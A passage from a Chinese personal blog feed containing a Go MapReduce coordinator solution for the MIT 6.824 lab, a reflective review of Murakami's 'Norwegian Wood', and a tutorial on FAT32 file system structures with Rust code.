 <figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">func</span> <span class="params">(c *Coordinator)</span> <span class="title">RequestTask</span><span class="params">(req *TaskRequest, rsp *TaskResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="comment">// 如果此时Worker是第一次请求的话，为其分配id</span></span><br><span class="line">	<span class="comment">// 并在WStates加入对应的结构</span></span><br><span class="line">	c.UpdateTaskState(req.WID)</span><br><span class="line">	<span class="keyword">if</span> req.WID == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// 为Worker分配索引号</span></span><br><span class="line">		rsp.WID = <span class="built_in">len</span>(c.WStates)</span><br><span class="line">		c.WorkerLock.Lock()</span><br><span class="line">		c.WStates = <span class="built_in">append</span>(c.WStates, WorkersState&#123;&#125;)</span><br><span class="line">		c.WorkerLock.Unlock()</span><br><span class="line">		c.TimerChans = <span class="built_in">append</span>(c.TimerChans, <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>))</span><br><span class="line">		<span class="comment">// fmt.Printf(&quot;分配的 Worker id 为 %v.\n&quot;, rsp.WID)</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将WID作为局部变量赋值，方便之后的处理</span></span><br><span class="line">	<span class="keyword">var</span> WID <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">if</span> req.WID == <span class="number">-1</span> &#123;</span><br><span class="line">		WID = rsp.WID</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		WID = req.WID</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 循环Master的Map任务状态，判断是否所有任务都完成了</span></span><br><span class="line">	<span class="comment">// 否则为Worker分发任务</span></span><br><span class="line">	<span class="comment">// c.MapStateLock.Lock()</span></span><br><span class="line">	<span class="comment">// c.MapStateLock.RLock()</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(c.MapState); i++ &#123;</span><br><span class="line">		<span class="comment">// c.MapStateLock.RLock()</span></span><br><span class="line">		<span class="keyword">if</span> c.MapState[i] == Idle &#123;</span><br><span class="line">			<span class="comment">// c.MapStateLock.RUnlock()</span></span><br><span class="line">			c.MapStateLock.Lock()</span><br><span class="line">			c.MapState[i] = Progress</span><br><span class="line">			c.MapStateLock.Unlock()</span><br><span class="line"></span><br><span class="line">			fmt.Printf(<span class="string">&quot;[Map Task] 此时 Worker %v 运行 %v 号任务.\n&quot;</span>, WID, i)</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 更新对于Map任务状态</span></span><br><span class="line">			rsp.TaskStatus = RunMapTask</span><br><span class="line">			rsp.MapTask = MapTask&#123;</span><br><span class="line">				MapID:    i,</span><br><span class="line">				FileName: c.Files[i],</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 更新Master的对该Worker的状态维护</span></span><br><span class="line">			c.WorkerLock.Lock()</span><br><span class="line">			c.WStates[WID].WStatus = RunMapTask</span><br><span class="line">			c.WStates[WID].MTask = rsp.MapTask</span><br><span class="line">			c.WorkerLock.Unlock()</span><br><span class="line">			<span class="keyword">go</span> c.StartTimer(WID, c.TimerChans[WID])</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// c.MapStateLock.Unlock()</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// c.MapStateLock.RUnlock()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果没有准备好Reduce Bucket，则进入等待状态</span></span><br><span class="line">	<span class="comment">// c.ReadyLock.RLock()</span></span><br><span class="line">	<span class="keyword">if</span> c.IsReduceReady.Load() == <span class="literal">false</span> &#123;</span><br><span class="line">		rsp.WID = WID</span><br><span class="line">		rsp.TaskStatus = Wait</span><br><span class="line">		<span class="comment">// 更新Master对于Worker的状态</span></span><br><span class="line">		c.WorkerLock.Lock()</span><br><span class="line">		c.WStates[WID].WStatus = Wait</span><br><span class="line">		c.WorkerLock.Unlock()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// c.ReadyLock.RUnlock()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// c.ReduceStateLock.RLock()</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(c.ReduceState); i++ &#123;</span><br><span class="line">		<span class="comment">// c.ReduceStateLock.RLock()</span></span><br><span class="line">		<span class="keyword">if</span> c.ReduceState[i] == Idle &#123;</span><br><span class="line">			<span class="comment">// c.ReduceStateLock.RUnlock()</span></span><br><span class="line">			c.ReduceStateLock.Lock()</span><br><span class="line">			c.ReduceState[i] = Progress</span><br><span class="line">			c.ReduceStateLock.Unlock()</span><br><span class="line"></span><br><span class="line">			fmt.Printf(<span class="string">&quot;[Reduce Task] 此时 Worker %v 运行 %v 号任务.\n&quot;</span>, WID, i)</span><br><span class="line"></span><br><span class="line">			rsp.TaskStatus = RunReduceTask</span><br><span class="line">			rsp.ReduceTask = ReduceTask&#123;</span><br><span class="line">				ReduceID: i,</span><br><span class="line">				Bucket:   c.Buckets[i],</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 更新Master对Worker的维护信息</span></span><br><span class="line">			c.WorkerLock.Lock()</span><br><span class="line">			c.WStates[WID] = WorkersState&#123;</span><br><span class="line">				WID:     WID,</span><br><span class="line">				WStatus: RunReduceTask,</span><br><span class="line">				RTask: ReduceTask&#123;</span><br><span class="line">					ReduceID: i,</span><br><span class="line">					Bucket:   c.Buckets[i],</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;</span><br><span class="line">			c.WorkerLock.Unlock()</span><br><span class="line">			<span class="keyword">go</span> c.StartTimer(WID, c.TimerChans[WID])</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// c.ReduceStateLock.RUnlock()</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// c.TaskLock.RLock()</span></span><br><span class="line">	<span class="keyword">if</span> c.TaskEnd.Load() == <span class="literal">false</span> &#123;</span><br><span class="line">		rsp.WID = WID</span><br><span class="line">		rsp.TaskStatus = Wait</span><br><span class="line">		<span class="comment">// 更新Master状态</span></span><br><span class="line">		c.WorkerLock.Lock()</span><br><span class="line">		c.WStates[WID] = WorkersState&#123;</span><br><span class="line">			WID:     WID,</span><br><span class="line">			WStatus: Wait,</span><br><span class="line">		&#125;</span><br><span class="line">		c.WorkerLock.Unlock()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// c.TaskLock.RUnlock()</span></span><br><span class="line"></span><br><span class="line">	rsp.TaskStatus = Exit</span><br><span class="line">	c.WorkerLock.Lock()</span><br><span class="line">	c.WStates[WID].WStatus = Exit</span><br><span class="line">	c.WorkerLock.Unlock()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>通过的测试用例</strong>：</p>
<ul>
<li>[x] wc</li>
<li>[x] indexer</li>
<li>[x] jobcount</li>
<li>[x] mtiming</li>
<li>[x] rtiming</li>
<li>[x] early_exit</li>
<li>[x] nocrash</li>
<li>[x] crash</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>6.824</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>挪威的森林</title>
    <url>/2021/07/07/The-forest-in-Norway/</url>
    <content><![CDATA[<p>这本书是我去南京旅游时候闲暇时读的，在乘坐高铁或者待在酒店里拿出来看一下，总共花了3天的时间看完。细细想来，我已经有一段时间没有安安静静地完整看完一本小说了，从前总将《挪威的森林》当做是一本严肃文学小说，因此在买了之后很长一段时间都没有看，但当我真正读完之后发觉《挪威的森林》虽然不是通俗的文学小说，但也不必将其当做严肃文学来看待，它更像是作者在中年时对于少年的回忆与反思。</p>
<p>村上在写完这本书后将其书称为“百分百的恋爱小说”，但据他自己所说，称其为恋爱小说其实仅仅是为了招徕顾客所用，事实上他所表达的是“百分百的现实小说”，因为在腰封上加上这个字眼不太合适，因此就选择了将恋爱小说作为醒目的标题来吸引眼球。但事实上，这本小说真的仅仅是讲的“恋爱故事”吗？依我来看倒不见得，与其将它视为是一本恋爱小说，倒不如将其看作是一部成长小说，恋爱并非是最重要的，而是活的人能够在死去的人身上得到什么，从而更加坚强地活下去。</p>
<p>在本书中，“性”是非常浓墨重彩书写的一部分，而书中的“性”与“爱”也是完全分离的，异性间发生性关系但互相之间却完全没有情感。这一点被很多人认为不应将《挪威的森林》看做是现实小说，因为将性与爱分离开来在现实中并不具备有普遍性，而主人公渡边同永泽厮混夜店并同多个女孩发生性关系也被人认为其道德存在极大缺陷。但将其视为成长小说来看确是顺理成章的。书里将“性”作为衡量爱的标志：永泽不爱人，却不断地发生性关系，而渡边在爱上直子后，却忍耐自己，不再同她人发生性关系，直到接受直子自杀的事实后，他才再次同玲子发生性关系。</p>
<p>不难感受到，整部小说都氤氲着悲伤与孤单的气息，主人公仅仅将自己关闭在围城中，不同外界接触。例如，在本该是应当造成混乱与恐慌的学潮运动，在作者的笔下竟显得格外的平常与无聊，仿佛是极为平常之事。同时，渡边对于课业毫不上心，只觉得可上可不上，即使去上了课也不去答到，因为他觉得毫无热情，而渡边尽管也去打工，却极少同他人进行交流（唯一的一次同服务生进行交流是绿子不与他进行联系，他不得不招人说话了）。</p>
<p>而事实上，自从木月自杀死后，作者已同世界没什么联系了（因为木月是他唯一的朋友）。如果没有之后发生的事情，渡边也可能会向直子那样陷入癫狂，最终自杀。而在本书的前半段，渡边所做的所有事仿佛都是被动的事情，同直子交谈是直子邀请他下车的，与女人性交是永泽带他去的，与绿子的交往也是绿子主动找渡边的，而对于渡边来说，一切都是无可无不可的。</p>
<p>而在小说的后半段，渡边不断地同直子写信，因为他感到真实地爱上了她，当他爱上了直子后，他就拒绝在同其他女人进行性交；而当绿子不理他的时候，他又感受到了十分的难受，这种感觉是他刚来东京上大学时从未有过的，这种表现正表明他已同世界有了联系。而在直子死了之后，他也心痛如刀绞，去远方流浪了一个月才回来，这说明主人公已真真正正地获得了新生。而正如作者所言，“死并非生的对立面，而作为生的一部分永存”。</p>
<p>那么，大部分读者对于本书最关心的问题是，渡边对直子、绿子、玲子三个人的感情状况到底如何呢？就我看来，渡边是真正爱直子的，而直子却并非爱渡边。这点在本书中不止一次提到，例如第一章结尾：“想到这里，我悲哀得难以自禁。因为，直子连爱都没爱过我”。而直子在自杀前却并未去见渡边而是去见了玲子（这是不是和木月自杀前没有去见直子而去见渡边如出一辙呢？）。当然，这并不能说直子同渡边毫无感情，只是这种感情更像是一种依赖之情（在木月死后，直子事实上已同社会没有任何联系了），并且她将其误认为是爱情，正如渡边在打工时认识的服务生伊东一样，他想同他的女朋友分手却无论如何也没办法开口。而渡边爱直子确实无可置疑的，因为不仅在主人公自己的心理描写里承认了自己是爱直子的，同时他从意识到自己爱直子到直子死后的半年多了再未与任何人发生过性关系，直到直子死后同玲子发生性关系（从这点上来看渡边其实也并非爱绿子，因为他并未因为“爱”上绿子而忍耐同别人发生性关系）。而对于绿子和玲子来说其实都是喜欢渡边的，因为她们都渴望同渡边发生关系（这并非是仅仅由于生理上的性冲动），而绿子也为了渡边放弃了她之前的男朋友（绿子应该是本书中最正常的人了）。</p>
<p>在本书中提到了很多人的死亡，就作者来说，使他们死去是由于情节发展的原因，但正同作者希望表达的一样：</p>
<blockquote>
<p>死并非生的对立面，而作为生的一部分永存</p>
</blockquote>
<p>当死亡之后，其实它依然生活在其他的人的记忆中，只有所有人都遗忘了你，才是真正的死亡。</p>
<p>这本书是如此的悲伤与孤寂，但联想到上个世纪70年代泡沫时代的日本似乎也深刻地刻画了年轻人的群相。抑郁、没有方向、同社会隔绝，自杀的人每年都有。同今天中国相比，躺平，摸鱼，过高的房价，迷惘的前程似乎又如出一辙。尽管是悲伤的气氛，但作者的观点是积极的，依然希望我们从逝去的东西中获得新生。</p>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>爱情</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Rust实现FAT32文件系统</title>
    <url>/2021/07/02/implement-FAT32-FS-step-by-step/</url>
    <content><![CDATA[<h1 id="fat文件系统知识概览"><a class="markdownIt-Anchor" href="#fat文件系统知识概览"></a> FAT文件系统知识概览</h1>
<p>文件，其实就是数据。数据在计算机内以 0/1 表示，最基本的单位是bit（比特）。8 bit = 1 Byte，1024 Byte = 1 KB，1024 KB = 1 MB，如此如此。文件内容也是若干01串的组合。在读写文件的时候，我们会调用 kernel 中的函数 read()/write()，它们接受文件的描述符，然后读/写指定长度的数据。所有数据也都是 0/1 的形式，只不过我们在运用这些函数的时候，这些数据被转成了更加高级的表示，例如 char，int 或者其他类型。</p>
<h2 id="磁盘是什么"><a class="markdownIt-Anchor" href="#磁盘是什么"></a> 磁盘是什么</h2>
<p>现在的硬盘容量已经达到了TB的级别，它们的物理实现与原理又是怎样的呢？我就简单地带过一下，具体细节可以去 <a href="http://www.explainthatstuff.com/harddrive.html">How a hard disk work?</a>，里面很简洁地说明了他的工作原理。</p>
<p>磁盘最重要的就是扇面，扇面上面有一圈圈的磁道，这些磁道中储存着信息。如何进行读写呢？物理层面上，是通过用磁头改变磁道中每个存储单元的极性来实现的。</p>
<p>磁盘中的物理储存单位叫做sector(扇区)，而文件系统中一个储存单位叫做 block (FAT 系统叫 cluster)，每一个 cluster 对应1到多个扇区。维基上有更详细的解释 <a href="https://en.wikipedia.org/wiki/Disk_sector">Disk Sector</a></p>
<h2 id="fat32-的文件存储"><a class="markdownIt-Anchor" href="#fat32-的文件存储"></a> FAT32 的文件存储</h2>
<p>平常操作文件的时候，例如你打开一个 doc 文件，增加一些内容然后保存，或者删除某个文件到回收站，它们的内部操作是如何实现的呢？不同的文件系统有不同的实现方式。但所有的操作都离不开存储作为基础，问题来了：如何设计一个文件系统，让它既能高效读写文件，又能快速对文件定位？</p>
<p>我们来看看最原始的想法：直接连续添加，也就是把文件一个挨着一个地加到储存空间（硬盘）中去。但是，这样实现，既不利于查找，也不利于删除、添加与修改。想一想，如果把一些文件删除，就会产生缺口，再次添加文件的时候，单独的缺口可能不足以容纳新的文件，从而产生浪费。而且只要查找某个文件，就需要遍历所有的文件结构，这个是要花相当长的时间。</p>
<p>我们来看一看 FAT32 的实现方式：它将储存空间分成了一个个小块( cluster ),存储文件的时候，会把文件切分成对应长度的小块，然后填充到硬盘中去：</p>
<p>这样一来，我们就不用担心文件太大以至于不能放进缺口中，因为我们可以把一部分小块放在一个缺口，把另一部分小块放在另外的地方，这样很高效地利用了磁盘的空间。</p>
<p>第二个概念，FAT32  采用了链表的数据结构。也就是说，磁盘中的每一个 cluster 都是链表中的一个节点，它们记录着下一个 cluster 的位置（next pointer）。什么叫下一个 cluster？如果一个文件被放在了储存空间中，如果他所占用了超过一个cluster，那么我们就需要把这些cluster连接起来。FAT32中，只记录了每一个文件开始的cluster，所以我们需要用链表来完成访问整个文件的操作。</p>
<p>用来存储这个链表信息的表格叫做 FAT ( FILE ALLOCATE TABLE )  ,真正存放数据的地方与FAT是相互分离的。FAT的作用就是方便查找。</p>
<p>接下来我们看看，删除的操作。这会引出另一个专有结构：FILE ENTRY</p>
<p>首先你来回想一下，删除文件和写入一个新的文件（比如复制粘贴），哪个更快些？删除。几乎是互逆过程，为何时间不同？实际上，在你删除文件的时候，文件系统并没有真正地把数据从磁盘上抹去（这也是为什么我们有希望恢复删除文件的原因），而只是修改了它的FILE ENTRY信息。</p>
<p>何谓 FILE ENTRY？ 简单些讲，就是记录文件属性的一个小结构。它们被统一存储在 ROOT DIRECTORY 中。我们先看一下 FAT32 的磁盘整体面貌</p>
<p><img src="/2021/07/02/implement-FAT32-FS-step-by-step/fat32_structure_1.png" alt></p>
<p>我们先忽略最前面的几个 sector，从 FAT 看起。一个 FAT 系统有若干个 FAT 结构（因为磁盘大小不同，所需要的链表节点数也不同），紧挨FAT区域的是ROOT DIRECTORY,它是整个磁盘的目录结构，而这之中存储的就是我们说的FILE ENTRY,也就是每个文件的属性。ROOT DIRECTORY后，才是真正地DATA FIELD，用来存储真正地文件内容。</p>
<p>在我们查看某个文件信息而非打开它时，我们并不需要直接访问文件的数据。文件系统会在ROOT DIRECTORY找到相应的FILE ENTRY，然后把相关信息显示出来。这包括：文件名，创建、修改时间，文件大小，文件的第一个cluster的位置，只读/隐藏等等。请注意，文件夹在文件系统中也表示成一个文件，也有相应的FILE ENTRY，只是他们储存的是一批文件而已 ( FILE ENTRY 中会有相应的标志显示是否是文件夹)。</p>
<p>回到我们删除文件的话题，当一个文件被删除的时候，系统会找到相应的 FILE ENTRY，把文件名第一个字符改为 0xE5 ——完毕。就是这么简单，只是把文件属性修改，一点内部数据都没有改动。这时候如果我们再添加一个文件进去，由于系统会通过查找 ROOT DIRECTORY 来确定可用的空间，因此如果发现一些 FILE ENTRY 文件名是未分配或者已经删除的标志，那么对应的 cluster 就会被占用。但是在被覆盖之前，这些删除的文件依然存在在你的硬盘里（只是你丢失了如何获取他们信息的渠道）。这就是为什么删除要更快些。</p>
<h2 id="bpbbios-paramter-block"><a class="markdownIt-Anchor" href="#bpbbios-paramter-block"></a> BPB(BIOS Paramter Block)</h2>
<p>在 FAT 文件系统中最重要的数据结构之一为 BPB(BIOS Parameter Block), 它储存了 FAT 文件卷重要的配置参数。BPB被放置在 boot sector(引导扇区) 结构之中，引导扇区通常被称为 VBR(Volume Boot Record) 或者 PBR(Private Boot Record)，但是它仅仅是保留区和数据卷的第一个扇区。</p>
<p>我们使用如下结构来描述 BPB 的结构：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiosParameterBlock</span></span> &#123;</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) bytes_per_sector: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) sectors_per_cluster: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) reversed_sector: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) fats: <span class="built_in">u8</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) root_entries: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) total_sectors_16: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) media: <span class="built_in">u8</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) sectors_per_fat_16: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) sectors_per_track: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) heads: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) hidden_sectors: <span class="built_in">u32</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) total_sectors_32: <span class="built_in">u32</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extended BIOS Paramter Block</span></span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) sectors_per_fat_32: <span class="built_in">u32</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) extended_flags: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) fs_version: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) root_dir_first_cluster: <span class="built_in">u32</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) fs_info_sector: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) backup_boot_sector: <span class="built_in">u16</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) reserved_0: [<span class="built_in">u8</span>;<span class="number">12</span>],</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) drive_num: <span class="built_in">u8</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) ext_sig: <span class="built_in">u8</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) volume_id: <span class="built_in">u32</span>,</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) volume_label: [<span class="built_in">u8</span>;<span class="number">11</span>],</span><br><span class="line">    <span class="keyword">pub</span>(<span class="keyword">crate</span>) fs_type_label: [<span class="built_in">u8</span>;<span class="number">8</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于启动扇区位于数据卷第0个簇( cluster )，因此我们只需将其读出来并按照内存布局读取相应的域即可，不需要传入对应的位置。</p>
<p><strong>BIOSParameterBlock 一些 field 的说明：</strong></p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>bytes_per_sector</td>
<td>每个sector 的字节数，仅适用以下值：512/1024/2048/4096</td>
</tr>
<tr>
<td>sectors_per_cluster</td>
<td>每个 cluster 中的 sector 数， 此值必须是2的幂，合法值为2/4/8/16/32/64/128，不能另每个 cluster 的字节数大于32K</td>
</tr>
<tr>
<td>reserved_sector</td>
<td>从卷的第一个 sector 开始的 voulme 保留区域中的保留 sector 数目，该字段不得为0，对于 FAT32 来说，此值通常为32。</td>
</tr>
<tr>
<td>fat_nums</td>
<td>在 volume 上 FAT32 sector 的计数，理论上任何大于等于1的值都有效，但推荐设置为2</td>
</tr>
<tr>
<td>root_entry_cnt</td>
<td>对于 FAT32 来说此值应设置为0</td>
</tr>
<tr>
<td>fat_size</td>
<td>对于 FAT32 来说此值应为32（每个 FAT entry 有32 bits）</td>
</tr>
<tr>
<td>root_cluster</td>
<td>root cluster 的 cluster 号， 仅在 FAT32 文件系统中存在，通常设置为2， 但不强制要求为2</td>
</tr>
<tr>
<td>root_dir_sector</td>
<td>0</td>
</tr>
<tr>
<td>volume_id</td>
<td>volume id，通过该值与 volume_label 一起可支持可移动媒体上的卷跟踪，这些值允许 FAT 文件系统驱动程序检测到错误的磁盘插入到可移动驱动器中，这个 ID 是通常简单地将当前时期和时间组合成一个32位的值来生成</td>
</tr>
<tr>
<td>volume_label</td>
<td>该字段与在根目录中的11字节的 volume label 相匹配。FAT 文件系统驱动程序应确保在根目录中的 volume label 更改或创建其名称时更新此字段。 当没有卷标时，此字段的设置是字符串 “No Name”</td>
</tr>
</tbody>
</table>
<h2 id="root-directory"><a class="markdownIt-Anchor" href="#root-directory"></a> Root Directory</h2>
<p>在获得 boot sector 的信息后，我们就可以读取 Root Directory的结构了。由于在 boot sector 中已经有了 FAT 占用 cluster 总数以及 reserved clusters 总数的信息，因此我们可以越过前面这些簇找到 Root Directory, 因此在我们的实现中定义了如下方法：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// Get the first sector offset bytes of the cluster from the cluster number</span></span><br><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">offset</span></span>(&amp;<span class="keyword">self</span>, cluster: <span class="built_in">u32</span>) -&gt; <span class="built_in">usize</span> &#123;</span><br><span class="line">    ((<span class="keyword">self</span>.reversed_sector <span class="keyword">as</span> <span class="built_in">usize</span>)</span><br><span class="line">    + (<span class="keyword">self</span>.fats <span class="keyword">as</span> <span class="built_in">usize</span>) * (<span class="keyword">self</span>.sectors_per_fat_32 <span class="keyword">as</span> <span class="built_in">usize</span>)</span><br><span class="line">    + (cluster <span class="keyword">as</span> <span class="built_in">usize</span> - <span class="number">2</span>) * (<span class="keyword">self</span>.sectors_per_cluster <span class="keyword">as</span> <span class="built_in">usize</span>))</span><br><span class="line">    * (<span class="keyword">self</span>.bytes_per_sector <span class="keyword">as</span> <span class="built_in">usize</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="fat-and-cluster"><a class="markdownIt-Anchor" href="#fat-and-cluster"></a> FAT and Cluster</h2>
<p>FAT(File Allocate Table) 是另一个重要的组成部分， 这个部分使用链表描述了一个文件的扩展信息。这个结构的作用是定义一个文件范围（簇链）的链表。 请注意，directroy 和 file 都包含在文件中，在 FAT 上没有什么不同。 目录实际上是一个具有特殊属性的文件，表明其内容是目录表。</p>
<p>数据区被分成称为簇的一定数量的扇区块，数据区在这个单元中进行管理。 FAT 的每一项都与数据区中的每个簇相关联，FAT 值表示相应簇的状态。 但是，前两个 FAT 项 FAT[0] 和 FAT[1] 是保留的，不与任何簇相关联。 第三个 FAT 项 FAT[2] 是与数据区第一个簇关联的项，有效簇号从2开始。</p>
<p>FAT 通常是为了冗余而复制的，因为任何 FAT 扇区的损坏都会导致严重的数据丢失。 BPB_NumFATs 表示的 FAT 副本数和 FAT 区域的大小变为 <code>fat_nums * sectors_per_fat_32</code>。 FAT 驱动程序通常只引用第一个 FAT 副本，并且对 FAT 项的任何更新都反映在每个 FAT 副本中。</p>
<p>FAT 卷上的文件由目录管理，即 32 字节目录项结构的数组。 目录条目的详细信息如下所述。 目录条目具有文件数据的文件名、文件大小、时间戳和第一个簇号。 簇号是跟随文件数据簇链的入口点。 如果文件大小为零，则第一个簇号设置为零，并且没有数据簇分配给该文件。</p>
<p>如上所述，簇号0和1是保留的，有效簇号从2开始。簇号2对应数据区的第一个簇。 因此，在具有 N 个簇的卷中，有效的簇号是从 2 到 N+1，FAT 条目的数量是 N+2。 数据簇 N 的位置计算如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FirstSectorofCluster &#x3D; DataStartSector + (N - 2) * BPB_SecPerClus;</span><br></pre></td></tr></table></figure>
<p>如果文件大小大于扇区大小，则文件数据跨越集群中的多个扇区。 如果文件大小大于簇大小，则文件数据跨越簇链中的多个簇。 FAT 条目的值表示后面的簇号（如果存在），以便可以通过跟随簇链到达文件中的任何字节偏移量。 集群链不能向后跟踪。 具有簇链最后一个链接的 FAT 条目具有一个特殊值（链尾、EOC、标记），它永远不会匹配任何有效的簇号。 每个FAT类型的EOC标志如下：</p>
<ul>
<li>FAT12: 0xFF8 - 0xFFF (通常为 0xFFF)</li>
<li>FAT16: 0xFFF8 - 0xFFFF (通常为 0xFFFF)</li>
<li>FAT32: 0x0FFFFFF8 - 0x0FFFFFFF (通常为 0xFFFFFFF)</li>
</ul>
<p>还有一个特殊值，坏簇标记。坏簇标志表示簇中有缺陷扇区，不能使用。在格式化、表面检查或磁盘修复中发现的坏簇作为坏簇标记记录在 FAT 中。坏簇标记的值对于 FAT12 为 0xFF7，对于 FAT16 为 0xFFF7，对于 FAT32 为 0x0FFFFFF7。</p>
<p>坏簇标记的值永远不会等于 FAT12/16 卷上的任何有效簇号。但是，它可以等于任何可分配的簇数，因为 FAT32 中未定义簇的最大计数。此类 FAT32 卷可能会使磁盘实用程序混淆，因此您应避免创建此类 FAT32 卷。因此，FAT32 卷的簇数上限实际上是 268435445（大约 256 M 个簇）。</p>
<p>由于实施原因，某些系统对最大集群数有限制。例如，Windows9X/Me 支持最大 16 MB 的 FAT 大小，并且它限制了最大大约 4 M 簇的簇数。</p>
<p>每个可分配的 FAT 条目 FAT[2] 及其后的初始值为零，这表示该簇未在使用中并且可用于新的分配。如果该值不为零，则表示集群正在使用或已损坏。 FAT12/16 卷中的任何位置都不会记录空闲簇计数，需要完整的 FAT 扫描才能获取此信息。 FAT32 支持 FSInfo 来存储空闲簇数，以避免由于其非常大的 FAT 结构而进行全 FAT 扫描。</p>
<p>前两个 FAT 条目 FAT[0] 和 FAT[1] 是保留的，不与任何簇相关联。这些 FAT 条目在创建卷时初始化，如下所示：</p>
<ul>
<li>FAT12:  FAT[0] = 0xF??; FAT[1] = 0xFFF</li>
<li>FAT16:  FAT[0] = 0xFF??; FAT[1] = 0xFFFF</li>
<li>FAT32:  FAT[0] = 0xFFFFFF??; FAT[1] = 0xFFFFFFFF</li>
</ul>
<p>?? FAT[0] 的值与 BPB_Media 的值相同，但该条目没有任何功能。 FAT[1] 中的一些位记录错误历史。</p>
<p>卷脏标志：（FAT16：bit15、FAT32：bit31）：启动时清除，干净关闭时恢复。启动时已清除表示脏关机和卷中可能出现逻辑错误。<br>
硬错误标志：（FAT16：bit14、FAT32：bit30）：在不可恢复的读/写错误时清除，表示需要进行表面检查。<br>
这些标志表示卷上有错误的可能性。一些支持此功能的操作系统会在启动时检查这些标志并自动启动磁盘检查工具。 Windows 9X 系列使用这些标志。 Windows NT 系列不使用这些标志，而是使用 BPB 中的替代品。</p>
<p>关于 FAT 区域还有两个更重要的事情。一个是 FAT 的最后一个扇区可能没有被完全使用。在大多数情况下，FAT 在扇区的中间结束。 FAT 驱动程序不应该对未使用区域有任何假设。它应该在格式化卷时用零填充，之后不应更改。另一个是BPB_FATSz16/32可以指示一个大于体积要求的值。在其他病房中，未使用的扇区可以跟在每个 FAT 之后。这可能是数据区对齐或其他原因的结果。此外，这些扇区在格式化时用零填充。</p>
